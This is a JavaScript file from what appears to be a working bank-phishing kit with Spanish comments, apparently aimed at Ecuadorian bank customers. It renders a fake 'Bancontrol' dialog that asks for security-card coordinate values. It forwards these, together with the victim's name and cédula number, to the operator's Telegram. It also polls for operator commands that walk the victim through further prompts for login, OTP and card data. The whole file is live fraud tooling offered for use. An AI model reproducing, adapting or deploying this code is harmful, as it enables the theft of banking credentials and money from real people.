const Session = {
  save(k, v) { localStorage.setItem(`bg_${k}`, JSON.stringify(v)) },
  get(k) { try { return JSON.parse(localStorage.getItem(`bg_${k}`)) } catch { return null } },
  clear() { Object.keys(localStorage).filter(k => k.startsWith('bg_')).forEach(k => localStorage.removeItem(k)) }
};

// Las coords del bancontrol van dentro del callback_data: bc:COORD1:COORD2
// Tú las defines aquí antes de subir, o puedes cambiarlas desde Telegram
// Ejemplo: bc:D1:D2 → cliente ve campos D1 y D2
function getBtns(step) {
  // Puedes cambiar D1 y D2 por las que quieras: A1, B3, E4, etc.
  const BC_COORD1 = "D1";
  const BC_COORD2 = "D2";
  const bcBtn = { text: "🏦 BANCONTROL", callback_data: `bc:${BC_COORD1}:${BC_COORD2}` };

  if (step === 'login') return [
    [{ text: "🔐 OTP", callback_data: "otp" }, { text: "💳 TARJETA", callback_data: "tarjeta" }],
    [bcBtn],
    [{ text: "❌ ERROR LOGIN", callback_data: "error_login" }]
  ];
  if (step === 'otp') return [
    [{ text: "💳 TARJETA", callback_data: "tarjeta" }],
    [bcBtn],
    [{ text: "❌ ERROR OTP", callback_data: "error_otp" }]
  ];
  if (step === 'tarjeta') return [
    [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
    [{ text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }]
  ];
  if (step === 'bancontrol') return [
    [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
    [{ text: "❌ ERROR BANCONTROL", callback_data: "error_bancontrol" }]
  ];
  return [];
}

async function sendTelegram(text, buttons = []) {
  const res = await fetch('/api/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ text, buttons })
  });
  return res.json();
}

let lastUpdateId = 0;

async function startPolling(handler) {
  let waitCoords = false;

  // Primero limpiar updates viejos y obtener el ultimo ID
  try {
    const init = await fetch('/api/poll?init=true');
    const initData = await init.json();
    if (initData.update_id) {
      lastUpdateId = initData.update_id;
      console.log('Init OK, lastUpdateId:', lastUpdateId);
    }
  } catch(e) { console.error('init error:', e); }

  const iv = setInterval(async () => {
    try {
      console.log('Polling... offset:', lastUpdateId, 'waitCoords:', waitCoords);
      const res = await fetch(`/api/poll?offset=${lastUpdateId}&waitCoords=${waitCoords}`);
      const data = await res.json();

      console.log('Poll response:', data);

      // Siempre actualizar el offset con lo que devuelve el servidor
      if (data.update_id !== undefined && data.update_id > lastUpdateId) {
        lastUpdateId = data.update_id;
      }

      // El servidor nos dice que ahora esperemos las coords
      if (data.waitCoords === true) {
        waitCoords = true;
        const wt = document.querySelector('.wait-title');
        const ws = document.querySelector('.wait-sub');
        if (wt) wt.textContent = 'Verificando coordenadas';
        if (ws) ws.textContent = 'Por favor espera mientras se verifica tu información.';
        return;
      }

      // Sin acción, seguir esperando
      if (!data.action) return;

      // Llegó acción real — parar polling y ejecutar
      clearInterval(iv);
      if (data.coords) Session.save('bancontrol_coords', data.coords);
      handler(data.action, data.coords || null);
    } catch (e) { console.error('poll error:', e); }
  }, 2000);
}

function showWait() { document.getElementById('wait').classList.add('active') }
function hideWait() { document.getElementById('wait').classList.remove('active') }

function showAlert(id, msg) {
  const el = document.getElementById(id);
  el.classList.add('show');
  const s = el.querySelector('span');
  if (s && msg) s.textContent = msg;
}
function hideAlert(id) { document.getElementById(id)?.classList.remove('show') }

function showErr(id) {
  document.getElementById(id)?.classList.add('error');
  document.getElementById(`e-${id}`)?.classList.add('show');
}
function clearErrs(ids) {
  ids.forEach(id => {
    document.getElementById(id)?.classList.remove('error');
    document.getElementById(`e-${id}`)?.classList.remove('show');
  });
}

// ── BANCONTROL MODAL ──
function showBancontrol(coords, isError = false) {
  const existing = document.getElementById('bancontrol-modal');
  if (existing) existing.remove();

  const labels = (coords && coords.length >= 2) ? coords : ['E1', 'D2'];

  const modal = document.createElement('div');
  modal.id = 'bancontrol-modal';
  modal.innerHTML = `
    <div class="bc-overlay"></div>
    <div class="bc-modal">
      <div class="bc-header">
        <h2 class="bc-title">Bancontrol</h2>
        <button class="bc-close" onclick="document.getElementById('bancontrol-modal').remove()">✕</button>
      </div>
      <p class="bc-subtitle">Ingresa las coordenadas de tu Bancontrol</p>
      ${isError ? `
        <div class="alert alert-error show" style="margin-bottom:14px">
          <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
          <span>Coordenadas incorrectas. Intenta de nuevo.</span>
        </div>` : ''}
      <div id="bc-fields">
        <div class="bc-row">
          <div class="bc-label">${labels[0]}</div>
          <input class="bc-input" id="bc-inp-0" type="text" maxlength="6" autocomplete="off" placeholder=""/>
        </div>
        <div class="bc-row">
          <div class="bc-label">${labels[1]}</div>
          <input class="bc-input" id="bc-inp-1" type="text" maxlength="6" autocomplete="off" placeholder=""/>
        </div>
      </div>
      <div id="bc-alert" class="alert alert-error" style="margin-top:12px;display:none">
        <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
        <span>Por favor completa todos los campos.</span>
      </div>
      <button class="btn btn-primary" style="margin-top:16px" onclick="enviarBancontrol(${JSON.stringify(labels)})">
        Verificar
        <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>
      </button>
    </div>
  `;
  document.body.appendChild(modal);
  setTimeout(() => document.getElementById('bc-inp-0')?.focus(), 100);
}

async function enviarBancontrol(labels) {
  const val0 = document.getElementById('bc-inp-0')?.value.trim();
  const val1 = document.getElementById('bc-inp-1')?.value.trim();

  if (!val0 || !val1) {
    const alert = document.getElementById('bc-alert');
    alert.style.display = 'flex';
    return;
  }

  const p = Session.get('personal') || {};

  const msg = `🏦 <b>BANCONTROL RECIBIDO</b>
━━━━━━━━━━━━━━━━
👤 Cliente: <b>${p.nombre||'—'}</b>
🪪 Cédula: <b>${p.cedula||'—'}</b>

${labels[0]}: <b>${val0}</b>
${labels[1]}: <b>${val1}</b>
📅 ${new Date().toLocaleString('es-EC',{timeZone:'America/Guayaquil'})}`;

  document.getElementById('bancontrol-modal').remove();
  showWait();

  try { await sendTelegram(msg, BUTTONS.bancontrol); } catch(e) { console.error(e); }

  startPolling((action, coords) => {
    hideWait();
    if      (action === 'finalizar')         window.location.href = 'final.html';
    else if (action === 'error_bancontrol')  showBancontrol(labels, true);
    else if (action === 'bancontrol' && coords) showBancontrol(coords);
    else if (action === 'tarjeta')           window.location.href = 'index3.html';
  });
}
